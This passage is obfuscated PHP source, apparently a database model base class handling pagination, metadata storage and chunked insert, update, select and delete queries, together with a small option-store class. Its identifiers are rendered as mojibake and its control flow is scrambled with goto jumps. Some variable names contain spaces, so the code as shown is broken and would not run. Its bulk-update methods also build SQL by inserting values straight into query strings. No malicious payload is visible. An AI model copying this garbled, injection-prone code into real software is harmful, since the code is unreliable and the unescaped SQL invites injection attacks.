cø≠›∑öŸÚ: $this->optionsValue($F∞¡ØÜ‚’Ò); $A≤ é’ÁÎï = $this->page($aàƒ£◊òîí, $Cëß—ÎèçÜ)->select(); if ($dπçÏ“ìŒ® == 1) { $b˘⁄Û ïÇµ = count($A≤ é’ÁÎï); } goto bßÇπ∫ƒÑ™; E±Üê≈ëºè: $DÀœã∞ˆÓ´ =& $_SERVER[£¿ÌÙëü¡¯¯]; global $in; $F∞¡ØÜ‚’Ò = $this->optionsValue(); goto Fê¶èäŸ±ƒ; bßÇπ∫ƒÑ™: $Eè†·Ò≠íÁ = array($DÀœã∞ˆÓ´[347] => array($DÀœã∞ˆÓ´[348] => $b˘⁄Û ïÇµ, $DÀœã∞ˆÓ´[345] => $Cëß—ÎèçÜ, $DÀœã∞ˆÓ´[336] => $aàƒ£◊òîí, $DÀœã∞ˆÓ´[349] => $dπçÏ“ìŒ®), $DÀœã∞ˆÓ´[350] => $A≤ é’ÁÎï ? $A≤ é’ÁÎï : array()); return $Eè†·Ò≠íÁ; goto fÚ∞∫Ãë∞Ø; f≤∫ùŸÎÜ¿: $b˘⁄Û ïÇµ = intval($this->count()); $Cëß—ÎèçÜ = intval($Cëß—ÎèçÜ); $Cëß—ÎèçÜ = $Cëß—ÎèçÜ <= 5 ? 5 : ($Cëß—ÎèçÜ >= $fã©øÂΩÒ ? $fã©øÂΩÒ : $Cëß—ÎèçÜ); goto C‘Òÿí≤Ω´; FÒÿ”Ùíƒ—: $Eé∑îâè≤≥ = $F∞¡ØÜ‚’Ò; $Eé∑îâè≤≥[$DÀœã∞ˆÓ´[346]] = array(); $this->optionsValue($Eé∑îâè≤≥); goto f≤∫ùŸÎÜ¿; C‘Òÿí≤Ω´: $dπçÏ“ìŒ® = ceil($b˘⁄Û ïÇµ / $Cëß—ÎèçÜ); $aàƒ£◊òîí = intval(isset($in[$DÀœã∞ˆÓ´[336]]) ? $in[$DÀœã∞ˆÓ´[336]] : $aàƒ£◊òîí); $aàƒ£◊òîí = $aàƒ£◊òîí <= 1 ? 1 : ($aàƒ£◊òîí >= $dπçÏ“ìŒ® ? $dπçÏ“ìŒ® : $aàƒ£◊òîí); goto cø≠›∑öŸÚ; Fê¶èäŸ±ƒ: $fã©øÂΩÒ = 4000; $Cëß—ÎèçÜ = isset($in[$DÀœã∞ˆÓ´[345]]) ? $in[$DÀœã∞ˆÓ´[345]] : $Cëß—ÎèçÜ; if ($Cëß—ÎèçÜ === -1) { unset($in[$DÀœã∞ˆÓ´[345]]); $fã©øÂΩÒ = 100000000; $Cëß—ÎèçÜ = $fã©øÂΩÒ; } goto FÒÿ”Ùíƒ—; fÚ∞∫Ãë∞Ø: } protected function checkLength($döï∑«≈¶Ê, $Cø’Ã∆ò≠¥ = 0, $d„åÖ…ÓﬁÃ = '') { $FÜ≈≤°„ù· =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cø’Ã∆ò≠¥ = $Cø’Ã∆ò≠¥ ? $Cø’Ã∆ò≠¥ : 65536; if (!$döï∑«≈¶Ê || strlen($döï∑«≈¶Ê) < $Cø’Ã∆ò≠¥) { return; } $d„åÖ…ÓﬁÃ = $d„åÖ…ÓﬁÃ ? $d„åÖ…ÓﬁÃ . $FÜ≈≤°„ù·[68] : $FÜ≈≤°„ù·[33]; show_json($d„åÖ…ÓﬁÃ . LNG($FÜ≈≤°„ù·[351]) . "\50{$Cø’Ã∆ò≠¥}\51", !1); } protected function metaSet($A‡úˆı™¨ƒ, $EáÙãé‚çŸ = null, $eπ◊Ÿ‘ÛÜ  = null) { goto eÆ…ÆºÙãÓ; FóÉ˜øƒ›˘: $b∑¬ª‰≤˜Â = Model($this->tableMeta[$Cà£¡óëæÍ[353]]); if (is_array($EáÙãé‚çŸ)) { $B£ä÷¯Ù˘ß = array(); foreach ($EáÙãé‚çŸ as $c¶±ãπÁüõ => $Aµ¬ˆîëÁ†) { $this->checkLength($Aµ¬ˆîëÁ†, !1, $this->tableMeta[$Cà£¡óëæÍ[353]] . $Cà£¡óëæÍ[4] . $c¶±ãπÁüõ); $B£ä÷¯Ù˘ß[] = array($d‘∞õ»ÏÔß => $A‡úˆı™¨ƒ, $Cà£¡óëæÍ[90] => $c¶±ãπÁüõ, $Cà£¡óëæÍ[354] => $Aµ¬ˆîëÁ†); } $b∑¬ª‰≤˜Â->where(array($d‘∞õ»ÏÔß => $A‡úˆı™¨ƒ))->addAll($B£ä÷¯Ù˘ß, array(), !0); return !0; } $fÈÙÕñº•í = array($d‘∞õ»ÏÔß => $A‡úˆı™¨ƒ, $Cà£¡óëæÍ[355] => $EáÙãé‚çŸ); goto e€∞â·ëùÓ; e€∞â·ëùÓ: if (is_null($EáÙãé‚çŸ)) { return $b∑¬ª‰≤˜Â->where(array($d‘∞õ»ÏÔß => $A‡úˆı™¨ƒ))->delete(); } if (is_null($eπ◊Ÿ‘ÛÜ )) { return $b∑¬ª‰≤˜Â->where($fÈÙÕñº•í)->delete(); } $this->checkLength($eπ◊Ÿ‘ÛÜ , !1, $this->tableMeta[$Cà£¡óëæÍ[353]] . $Cà£¡óëæÍ[4] . $EáÙãé‚çŸ); goto f∞âºÛ…‘Ú; eÆ…ÆºÙãÓ: $Cà£¡óëæÍ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->tableMeta) { return !1; } $d‘∞õ»ÏÔß = $this->tableMeta[$Cà£¡óëæÍ[352]]; goto FóÉ˜øƒ›˘; f∞âºÛ…‘Ú: $E‘≥ÛΩ≈Ñ = !1; if ($b∑¬ª‰≤˜Â->where($fÈÙÕñº•í)->find()) { $E‘≥ÛΩ≈Ñ = $b∑¬ª‰≤˜Â->where($fÈÙÕñº•í)->save(array($Cà£¡óëæÍ[356] => $eπ◊Ÿ‘ÛÜ )); } else { $fÈÙÕñº•í[$Cà£¡óëæÍ[354]] = $eπ◊Ÿ‘ÛÜ ; $E‘≥ÛΩ≈Ñ = $b∑¬ª‰≤˜Â->add($fÈÙÕñº•í); } return $E‘≥ÛΩ≈Ñ; goto b‚ıã§∂»≤; b‚ıã§∂»≤: } public function metaGet($EåÉå‡‘èà) { goto DÖõ∫äêêª; DÎßñº•®⁄: $Dƒ“ıæÂÌè = Model($this->tableMeta[$cÛûÑ†”‹[353]]); $FÂ∆•íä∂é = array($fíÓ‡‰òÖù => $EåÉå‡‘èà); $A∂ßÊÍÕ¥Â = $Dƒ“ıæÂÌè->field($cÛûÑ†”‹[357])->where($FÂ∆•íä∂é)->select(); goto bÛÛµ Ï«Ñ; bÛÛµ Ï«Ñ: $A∂ßÊÍÕ¥Â = array_to_keyvalue($A∂ßÊÍÕ¥Â, $cÛûÑ†”‹[90], $cÛûÑ†”‹[354]); return $A∂ßÊÍÕ¥Â; goto e¥‡‘™‘å·; DÖõ∫äêêª: $cÛûÑ†”‹ =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->tableMeta) { return array(); } $fíÓ‡‰òÖù = $this->tableMeta[$cÛûÑ†”‹[352]]; goto DÎßñº•®⁄; e¥‡‘™‘å·: } private function checkDataAutoHas($BéÈŒ≥ëÃ≤) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $cêÿ£íë—–) { if (in_array($BéÈŒ≥ëÃ≤, explode($_SERVER[£¿ÌÙëü¡¯¯][47], $cêÿ£íë—–[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$b≥ıèæ¢°∞, $bÒÚçππÛ¿) { $a¥ãÍ¡Öì =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($this->dataAuto as $Eºçá•—ÈÚ) { $cµø†›πÙù = $Eºçá•—ÈÚ[0]; if (!in_array($bÒÚçππÛ¿, explode($a¥ãÍ¡Öì[47], $Eºçá•—ÈÚ[2]))) { continue; } switch (trim($Eºçá•—ÈÚ[3])) { case $a¥ãÍ¡Öì[306]: case $a¥ãÍ¡Öì[307]: $fÕ˘éô…ëß = $Eºçá•—ÈÚ[1]; $B≠†ƒﬂóøÇ = isset($Eºçá•—ÈÚ[4]) ? (array) $Eºçá•—ÈÚ[4] : array(); if ($fÕ˘éô…ëß == $a¥ãÍ¡Öì[187] && array_key_exists($cµø†›πÙù, $b≥ıèæ¢°∞)) { if (!$b≥ıèæ¢°∞[$cµø†›πÙù]) { unset($b≥ıèæ¢°∞[$cµø†›πÙù]); } break; } if (isset($b≥ıèæ¢°∞[$cµø†›πÙù])) { array_unshift($B≠†ƒﬂóøÇ, $b≥ıèæ¢°∞[$cµø†›πÙù]); } if ($a¥ãÍ¡Öì[306] == $Eºçá•—ÈÚ[3]) { $b≥ıèæ¢°∞[$cµø†›πÙù] = call_user_func_array($fÕ˘éô…ëß, $B≠†ƒﬂóøÇ); } else { $b≥ıèæ¢°∞[$cµø†›πÙù] = call_user_func_array(array(&$this, $fÕ˘éô…ëß), $B≠†ƒﬂóøÇ); } break; case $a¥ãÍ¡Öì[258]: $b≥ıèæ¢°∞[$cµø†›πÙù] = $b≥ıèæ¢°∞[$Eºçá•—ÈÚ[1]]; break; case $a¥ãÍ¡Öì[279]: if (isset($b≥ıèæ¢°∞[$cµø†›πÙù]) && !is_string($b≥ıèæ¢°∞[$cµø†›πÙù])) { $b≥ıèæ¢°∞[$cµø†›πÙù] = json_encode_force($b≥ıèæ¢°∞[$cµø†›πÙù]); } break; case $a¥ãÍ¡Öì[308]: if ($b≥ıèæ¢°∞[$cµø†›πÙù] === $a¥ãÍ¡Öì[33]) { unset($b≥ıèæ¢°∞[$cµø†›πÙù]); } break; case $a¥ãÍ¡Öì[309]: $b≥ıèæ¢°∞[$cµø†›πÙù] = $Eºçá•—ÈÚ[1]; default: break; } } if ($bÒÚçππÛ¿ == $a¥ãÍ¡Öì[340]) { $d»¥À≠à”¿ = strtolower($this->db->getDbType()); if (strpos($d»¥À≠à”¿, $a¥ãÍ¡Öì[9]) !== 0) { return; } $cñÜ…©≥∆∑ = $this->field(!0)->fields; $FØ°Ωùº∑Ê = $cñÜ…©≥∆∑[$a¥ãÍ¡Öì[237]]; if (isset($cñÜ…©≥∆∑[$a¥ãÍ¡Öì[236]])) { unset($FØ°Ωùº∑Ê[$cñÜ…©≥∆∑[$a¥ãÍ¡Öì[236]]]); } foreach ($FØ°Ωùº∑Ê as $c†ò ‚Ü”– => $bÒÚçππÛ¿) { if (!isset($b≥ıèæ¢°∞[$c†ò ‚Ü”–])) { $b≥ıèæ¢°∞[$c†ò ‚Ü”–] = $a¥ãÍ¡Öì[33]; } } } } private function dataAfterFilter(&$bÖù∆∞≥¥∂) { $f ÖàÖ¥ˆæ =& $_SERVER[£¿ÌÙëü¡¯¯]; foreach ($this->dataAuto as $e÷Ù˜èñª◊) { $C´ÀÁË˜ºË = $e÷Ù˜èñª◊[0]; if (!in_array($f ÖàÖ¥ˆæ[342], explode($f ÖàÖ¥ˆæ[47], $e÷Ù˜èñª◊[2]))) { continue; } if (!isset($bÖù∆∞≥¥∂[$C´ÀÁË˜ºË])) { continue; } switch (trim($e÷Ù˜èñª◊[3])) { case $f ÖàÖ¥ˆæ[306]: case $f ÖàÖ¥ˆæ[307]: $AÉï∞ßÉêç = isset($e÷Ù˜èñª◊[4]) ? (array) $e÷Ù˜èñª◊[4] : array(); array_unshift($AÉï∞ßÉêç, $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË]); if ($f ÖàÖ¥ˆæ[306] == $e÷Ù˜èñª◊[3]) { $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] = call_user_func_array($e÷Ù˜èñª◊[1], $AÉï∞ßÉêç); } else { $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] = call_user_func_array(array(&$this, $e÷Ù˜èñª◊[1]), $AÉï∞ßÉêç); } break; case $f ÖàÖ¥ˆæ[258]: $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] = $bÖù∆∞≥¥∂[$e÷Ù˜èñª◊[1]]; break; case $f ÖàÖ¥ˆæ[279]: $E„æ∂ËÍπÁ = $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË]; $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] = json_decode($E„æ∂ËÍπÁ, !0); if (is_null($bÖù∆∞≥¥∂[$C´ÀÁË˜ºË])) { $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] = $E„æ∂ËÍπÁ; } break; case $f ÖàÖ¥ˆæ[308]: if ($bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] === $f ÖàÖ¥ˆæ[33]) { unset($bÖù∆∞≥¥∂[$C´ÀÁË˜ºË]); } break; case $f ÖàÖ¥ˆæ[309]: $bÖù∆∞≥¥∂[$C´ÀÁË˜ºË] = $e÷Ù˜èñª◊[1]; default: break; } } } public function saveAll($cá”óéÆ€ç) { goto Bπµ∂àØÒ∏; Bπµ∂àØÒ∏: $E∏‚´‡éúı =& $_SERVER[£¿ÌÙëü¡¯¯]; $DÆê⁄Íúﬂê = $this->tablePrefix . $this->tableName; $e∏Ôö´¯ÚÂ = self::SQL_WHERE_IN_CHUNK; goto C∞ÌÉ Ë≈á; fåÈçæÓ§: $EŸ°€¬£ã≠ = count($cá”óéÆ€ç); for ($eëı›ïÙé™ = 0; $eëı›ïÙé™ < $EŸ°€¬£ã≠; $eëı›ïÙé™++) { $Fß‘⁄±√≥” = $cá”óéÆ€ç[$eëı›ïÙé™]; if (!is_array($Fß‘⁄±√≥”) || count($Fß‘⁄±√≥”) != 4) { continue; } $c‚∫Íç˘è° = "\x55\x50\x44\x41\x54\x45\x20{$DÆê⁄Íúﬂê}\x20\x53\105\124\40{$Fß‘⁄±√≥”[2]}\x20\75\40\103\101\x53\105\x20{$Fß‘⁄±√≥”[0]}\x20\12"; if ($F“á¬ﬁéÊ® == 0) { $E≤ç—•«ÉŒ = $c‚∫Íç˘è°; } $eÁºÀó‘ëù[] = $E∏‚´‡éúı[114] . $Fß‘⁄±√≥”[1] . $E∏‚´‡éúı[114]; $F“á¬ﬁéÊ®++; $E≤ç—•«ÉŒ .= "\x20\127\110\x45\116\40\47{$Fß‘⁄±√≥”[1]}\47\40\x54\x48\x45\116\40\47{$Fß‘⁄±√≥”[3]}\x27\40\xa"; if ($F“á¬ﬁéÊ® == $e∏Ôö´¯ÚÂ || $eëı›ïÙé™ == $EŸ°€¬£ã≠ - 1) { goto BÕ˜ÑÂ°”†; f±Ω‘í⁄º¬: $F“á¬ﬁéÊ® = 0; $E≤ç—•«ÉŒ = $c‚∫Íç˘è°; $this->chunkEventCheck(count($eÁºÀó‘ëù)); goto AÂ©‘Ó”‚á; BÕ˜ÑÂ°”†: $A“∆“ãﬁå‚ = implode($E∏‚´‡éúı[47], $eÁºÀó‘ëù); $E≤ç—•«ÉŒ .= "\40\105\116\x44\x20\40\x57\110\105\x52\105\40{$Fß‘⁄±√≥”[0]}\x20\111\x4e\40\50{$A“∆“ãﬁå‚}\x29\x20"; $this->execute($E≤ç—•«ÉŒ); goto f±Ω‘í⁄º¬; AÂ©‘Ó”‚á: $eÁºÀó‘ëù = array(); goto bôÿêÚéºõ; bôÿêÚéºõ: } } $this->chunkEventSet(); goto aÑ¨Áπáﬁƒ; C∞ÌÉ Ë≈á: $E≤ç—•«ÉŒ = $E∏‚´‡éúı[358]; $F“á¬ﬁéÊ® = 0; $eÁºÀó‘ëù = array(); goto fåÈçæÓ§; aÑ¨Áπáﬁƒ: } public function saveAllEach($E¬¿ï§Ì«‚) { $Eôõ¶ı‹ü =& $_SERVER[£¿ÌÙëü¡¯¯]; $Eöõ√«¯ßµ = $this->tablePrefix . $this->tableName; foreach ($E¬¿ï§Ì«‚ as $E€’ÓÛÌåÁ) { if (!is_array($E€’ÓÛÌåÁ) || count($E€’ÓÛÌåÁ) != 4) { continue; } $b·πçåÜùÀ = $E€’ÓÛÌåÁ[0] . $Eôõ¶ı‹ü[359] . $E€’ÓÛÌåÁ[1] . $Eôõ¶ı‹ü[114]; $Bõì∏»‹±– = $E€’ÓÛÌåÁ[2] . $Eôõ¶ı‹ü[359] . $E€’ÓÛÌåÁ[3] . $Eôõ¶ı‹ü[114]; $b∫ìÜÒ¢π‘ = "\x75\x70\144\141\164\x65\40{$Eöõ√«¯ßµ}\40\163\x65\164\x20{$Bõì∏»‹±–}\40\167\150\x65\x72\x65\40{$b·πçåÜùÀ}\73"; $this->execute($b∫ìÜÒ¢π‘); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($AÒ∆Èã¯·Î = false, $f√ïÕ‹ƒﬂ = false) { $this->_chunkEvent = $AÒ∆Èã¯·Î; $this->_chunkEventParam = $f√ïÕ‹ƒﬂ; } private function chunkEventCheck($B¯ºœπ∫éç) { if (!$this->_chunkEvent) { return; } $D…—ëøßí‡ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $D…—ëøßí‡[$_SERVER[£¿ÌÙëü¡¯¯][360]] = $B¯ºœπ∫éç; Hook::trigger($this->_chunkEvent, $D…—ëøßí‡); } public function addAll($A£∏®ê∆ò±, $C≠ΩÉÔ ˘· = array(), $Bç∆ﬂ¡≈‹⁄ = false) { goto eﬁÇﬂ’—‘¢; cúß∏Ω‚≤·: if (method_exists($this->db, $F®íòáíÊË[257])) { for ($føÜﬁı€ãﬂ = 0; $føÜﬁı€ãﬂ < count($A£∏®ê∆ò±); $føÜﬁı€ãﬂ += $A¥º∑⁄◊§î) { $côï⁄⁄ËÓá = array_slice($A£∏®ê∆ò±, $føÜﬁı€ãﬂ, $A¥º∑⁄◊§î); if (!is_array($côï⁄⁄ËÓá) || count($côï⁄⁄ËÓá) == 0) { break; } $a˘≤∑œèà” = $this->db->insertAll($côï⁄⁄ËÓá, $C≠ΩÉÔ ˘·, $Bç∆ﬂ¡≈‹⁄); $this->chunkEventCheck(count($côï⁄⁄ËÓá)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($A£∏®ê∆ò± as $cè∆’ë„—À => $c©„¢ÎÇ·ı) { $a˘≤∑œèà” = $this->db->insert($c©„¢ÎÇ·ı, $C≠ΩÉÔ ˘·, $Bç∆ﬂ¡≈‹⁄); } $this->commit(); } if (!1 !== $a˘≤∑œèà”) { $déêŒ√ ´Ï = $this->getLastInsID(); if ($déêŒ√ ´Ï) { return $déêŒ√ ´Ï; } } return $a˘≤∑œèà”; goto c¬ÿØ§ûØÜ; eﬁÇﬂ’—‘¢: $F®íòáíÊË =& $_SERVER[£¿ÌÙëü¡¯¯]; ignore_timeout(); $A¥º∑⁄◊§î = self::SQL_WHERE_IN_CHUNK; goto B»·¯“Àù™; B»·¯“Àù™: if (empty($A£∏®ê∆ò±)) { $this->error = think_lang($F®íòáíÊË[256]); return !1; } $C≠ΩÉÔ ˘· = $this->_parseOptions($C≠ΩÉÔ ˘·); foreach ($A£∏®ê∆ò± as $cè∆’ë„—À => $c©„¢ÎÇ·ı) { $A£∏®ê∆ò±[$cè∆’ë„—À] = $this->_facade($c©„¢ÎÇ·ı); $this->_beforeInsert($A£∏®ê∆ò±[$cè∆’ë„—À], $C≠ΩÉÔ ˘·); } goto cúß∏Ω‚≤·; c¬ÿØ§ûØÜ: } public function save($D´”æÊäõæ = '', $b“çúøåıÜ = array()) { goto fÂûáïîıÊ; e» ´ÙíåŸ: $E∞ì‰ÓËÔ  = $cΩÌˆ≠‚⁄Á[$A©√…ú¡Í◊[260]][$bÂ·ãñ≠Ì][1]; $aÔ∞ùæ◊âƒ = count($E∞ì‰ÓËÔ ); for ($eùÖç¯çÍ√ = 0; $eùÖç¯çÍ√ < $aÔ∞ùæ◊âƒ; $eùÖç¯çÍ√ += $FÂŸà«…™Í) { $c≤âÙÃç∂á = array_slice($E∞ì‰ÓËÔ , $eùÖç¯çÍ√, $FÂŸà«…™Í); if (!is_array($c≤âÙÃç∂á) || count($c≤âÙÃç∂á) == 0) { break; } $cΩÌˆ≠‚⁄Á[$A©√…ú¡Í◊[260]][$bÂ·ãñ≠Ì][1] = $c≤âÙÃç∂á; $this->optionsValue($cΩÌˆ≠‚⁄Á); $cêÉã§õö„ += parent::save($D´”æÊäõæ, $b“çúøåıÜ); $this->chunkEventCheck(count($c≤âÙÃç∂á)); } goto cíéÁ‚á ´; fÂûáïîıÊ: $A©√…ú¡Í◊ =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÂŸà«…™Í = self::SQL_WHERE_IN_CHUNK; $cΩÌˆ≠‚⁄Á = $this->optionsValue(); goto f‘Øê≤ãüÍ; cíéÁ‚á ´: $this->chunkEventSet(); return $cêÉã§õö„; goto BË±üéîÊÇ; f‘Øê≤ãüÍ: $bÂ·ãñ≠Ì = $this->findWhereField($cΩÌˆ≠‚⁄Á); if (!$bÂ·ãñ≠Ì) { return parent::save($D´”æÊäõæ, $b“çúøåıÜ); } $cêÉã§õö„ = 0; goto e» ´ÙíåŸ; BË±üéîÊÇ: } public function add($FÌ–ª¡¡§≠ = '', $B∆ö™Ñ‚™£ = array(), $FÊ◊ƒ∑ê– = false) { if ($this->addTaskStatus && is_array($FÌ–ª¡¡§≠)) { $this->addTaskData[] = $FÌ–ª¡¡§≠; return; } return parent::add($FÌ–ª¡¡§≠, $B∆ö™Ñ‚™£, $FÊ◊ƒ∑ê–); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($B©ºËÉÍõÉ = array()) { goto DºÔÎ¨Æ“Ì; DÑœÂø⁄éÊ: $aπáóîÈ´ƒ = $this->findWhereField($BÑ±€ÊáÂæ); if (!$aπáóîÈ´ƒ || isset($BÑ±€ÊáÂæ[$cøƒÚ”¨—É[277]]) || isset($BÑ±€ÊáÂæ[$cøƒÚ”¨—É[336]])) { return parent::select($B©ºËÉÍõÉ); } $a˘Æ¡≥ÿŸ‚ = $BÑ±€ÊáÂæ[$cøƒÚ”¨—É[260]][$aπáóîÈ´ƒ][1]; goto eµÌÙõò¬Ë; DºÔÎ¨Æ“Ì: $cøƒÚ”¨—É =& $_SERVER[£¿ÌÙëü¡¯¯]; $fö“É∆Ì¯‡ = self::SQL_WHERE_IN_CHUNK; $BÑ±€ÊáÂæ = $this->optionsValue(); goto DÑœÂø⁄éÊ; eµÌÙõò¬Ë: $Dãªì’ÆÑß = null; for ($d ıŒöÆ∞ = 0; $d ıŒöÆ∞ < count($a˘Æ¡≥ÿŸ‚); $d ıŒöÆ∞ += $fö“É∆Ì¯‡) { $DÊÿ™∑¥äŒ = array_slice($a˘Æ¡≥ÿŸ‚, $d ıŒöÆ∞, $fö“É∆Ì¯‡); if (!is_array($DÊÿ™∑¥äŒ) || count($DÊÿ™∑¥äŒ) == 0) { break; } $BÑ±€ÊáÂæ[$cøƒÚ”¨—É[260]][$aπáóîÈ´ƒ][1] = $DÊÿ™∑¥äŒ; $this->optionsValue($BÑ±€ÊáÂæ); $d›ÌﬂÙËÏù = parent::select($B©ºËÉÍõÉ); if (!$d›ÌﬂÙËÏù) { continue; } if (is_null($Dãªì’ÆÑß)) { $Dãªì’ÆÑß = array(); } $Dãªì’ÆÑß = array_merge($Dãªì’ÆÑß, $d›ÌﬂÙËÏù); } return $Dãªì’ÆÑß; goto DÇÂéôúà˘; DÇÂéôúà˘: } public function delete($D·ÕúÏ¢èä = array()) { goto bæ—…ﬁŒ•‰; D˜ˆè—∏íÖ: $C´˜‡ÕÉœä = $this->findWhereField($EÑÆ†ﬂè≥œ); if (!$C´˜‡ÕÉœä) { return parent::delete($D·ÕúÏ¢èä); } $d®®œõ‚Ç« = 0; goto F¿◊∑Áó ∂; bæ—…ﬁŒ•‰: $aìè∞Ô—√ﬁ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Aƒ«∑ö—Æ◊ = self::SQL_WHERE_IN_CHUNK; $EÑÆ†ﬂè≥œ = $this->optionsValue(); goto D˜ˆè—∏íÖ; F¿◊∑Áó ∂: $f¿îß∆ã˘Ø = $EÑÆ†ﬂè≥œ[$aìè∞Ô—√ﬁ[260]][$C´˜‡ÕÉœä][1]; for ($f‘êÿ≈÷Ø© = 0; $f‘êÿ≈÷Ø© < count($f¿îß∆ã˘Ø); $f‘êÿ≈÷Ø© += $Aƒ«∑ö—Æ◊) { $EÃÇ“èé†§ = array_slice($f¿îß∆ã˘Ø, $f‘êÿ≈÷Ø©, $Aƒ«∑ö—Æ◊); if (!is_array($EÃÇ“èé†§) || count($EÃÇ“èé†§) == 0) { break; } $EÑÆ†ﬂè≥œ[$aìè∞Ô—√ﬁ[260]][$C´˜‡ÕÉœä][1] = $EÃÇ“èé†§; $this->optionsValue($EÑÆ†ﬂè≥œ); $d®®œõ‚Ç« += parent::delete($D·ÕúÏ¢èä); } return $d®®œõ‚Ç«; goto e†À¯çÉü©; e†À¯çÉü©: } private function findWhereField($Dá∑Èü§ßÑ) { $Aôå∆èååﬂ =& $_SERVER[£¿ÌÙëü¡¯¯]; $bﬁ¶î∑øã = self::SQL_WHERE_IN_CHUNK; if (!is_array($Dá∑Èü§ßÑ) || !is_array($Dá∑Èü§ßÑ[$Aôå∆èååﬂ[260]])) { return !1; } foreach ($Dá∑Èü§ßÑ[$Aôå∆èååﬂ[260]] as $F∏•ñ¬òÉ° => $eà≥›ääŒ·) { if (is_array($eà≥›ääŒ·) && isset($eà≥›ääŒ·[0]) && is_string($eà≥›ääŒ·[0]) && strtolower($eà≥›ääŒ·[0]) == $Aôå∆èååﬂ[7] && is_array($eà≥›ääŒ·[1]) && count($eà≥›ääŒ·[1]) > $bﬁ¶î∑øã) { ignore_timeout(); return $F∏•ñ¬òÉ°; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\x65\155\117\160\x74\x69\157\x6e"; public $field = array(); public function listData($FÙˆﬁÌıâ∞ = false, $eÛöÚãŒä = "\155\157\144\x69\146\171\x54\151\x6d\x65", $C∫Óäã€«ü = false) { $B‚èﬂè∑ô¥ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$FÙˆﬁÌıâ∞) { $B‚èﬂè∑ô¥ = array_filter(array_values($B‚èﬂè∑ô¥)); return array_sort_by($B‚èﬂè∑ô¥, $eÛöÚãŒä, $C∫Óäã€«ü); } return $B‚èﬂè∑ô¥[$_SERVER[£¿ÌÙëü¡¯¯][361] . $FÙˆﬁÌıâ∞]; } public function insert($Fﬂª≤ë±ÍÆ) { goto CÆıÇ£èÏß; f‰…¨“úﬁﬂ: $CøÈÉí©≤ù = $CøÈÉí©≤ù ? $CøÈÉí©≤ù : 0; $Fﬂª≤ë±ÍÆ[$fπò¡Üéá´[364]] = ++$CøÈÉí©≤ù; $Fﬂª≤ë±ÍÆ[$fπò¡Üéá´[184]] = time(); goto EÚ∫ë«◊Ò÷; EÚ∫ë«◊Ò÷: $Fﬂª≤ë±ÍÆ[$fπò¡Üéá´[108]] = time(); Model($this->modelType)->set($fπò¡Üéá´[362], $CøÈÉí©≤ù, $this->optionType . $fπò¡Üéá´[363]); Model($this->modelType)->set($fπò¡Üéá´[361] . $CøÈÉí©≤ù, $Fﬂª≤ë±ÍÆ, $this->optionType); goto AââÂ¶ìÜª; AââÂ¶ìÜª: return $CøÈÉí©≤ù; goto C‘∂åÿõ√ê; CÆıÇ£èÏß: $fπò¡Üéá´ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Fﬂª≤ë±ÍÆ = array_field_key($Fﬂª≤ë±ÍÆ, $this->field); $CøÈÉí©≤ù = Model($this->modelType)->get($fπò¡Üéá´[362], $this->optionType . $fπò¡Üéá´[363]); goto f‰…¨“úﬁﬂ; C‘∂åÿõ√ê: } public function update($aÜï≥Ã’Ôé, $FÈó∆Úñ¿∑) { goto Aä∏˘≠ËÁ£; d”¥£Î¡ÜÕ: return Model($this->modelType)->set($bÍŒÑ•‰ÒË[361] . $aÜï≥Ã’Ôé, $FÈó∆Úñ¿∑, $this->optionType); goto dß™Ö·˜ê—; e—á¥ˆèø—: if (!$F¯√ÑΩÍ¡¬) { return !1; } $FÈó∆Úñ¿∑ = array_merge($F¯√ÑΩÍ¡¬, $FÈó∆Úñ¿∑); $FÈó∆Úñ¿∑[$bÍŒÑ•‰ÒË[108]] = time(); goto d”¥£Î¡ÜÕ; Aä∏˘≠ËÁ£: $bÍŒÑ•‰ÒË =& $_SERVER[£¿ÌÙëü¡¯¯]; $FÈó∆Úñ¿∑ = array_field_key($FÈó∆Úñ¿∑, $this->field); $F¯√ÑΩÍ¡¬ = $this->listData($aÜï≥Ã’Ôé); goto e—á¥ˆèø—; dß™Ö·˜ê—: } public function remove($BáÏËıŒ∂™) { return Model($this->modelType)->remove($_SERVER[£¿ÌÙëü¡¯¯][361] . $BáÏËıŒ∂™, $this->optionType); } public function clear() { $f¬´±óﬂßÆ =& $_SERVER[£¿ÌÙëü¡¯¯]; Model($this->modelType)->remove($f¬´±óﬂßÆ[362], $this->optionType . $f¬´±óﬂßÆ[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($eå˘“∫á‘Ô, $a´£ò∆ÉŒª) { if (!$a´£ò∆ÉŒª) { return !1; } $bê∏ÊË¯⁄ı = $this->listData(); $bê∏ÊË¯⁄ı = array_to_keyvalue($bê∏ÊË¯⁄ı, $eå˘“∫á‘Ô); return isset($bê∏ÊË¯⁄ı[$a´£ò∆ÉŒª]) ? $bê∏ÊË¯⁄ı[$a´£ò∆ÉŒª] : !1; } public function findByName($dù«‡ﬂ«≠Ö) { return $this->findByKey($_SERVER[£¿ÌÙëü¡¯¯][28], $dù«‡ﬂ«≠Ö); } protected function resetData($AÖ›π∑∆œÏ) { 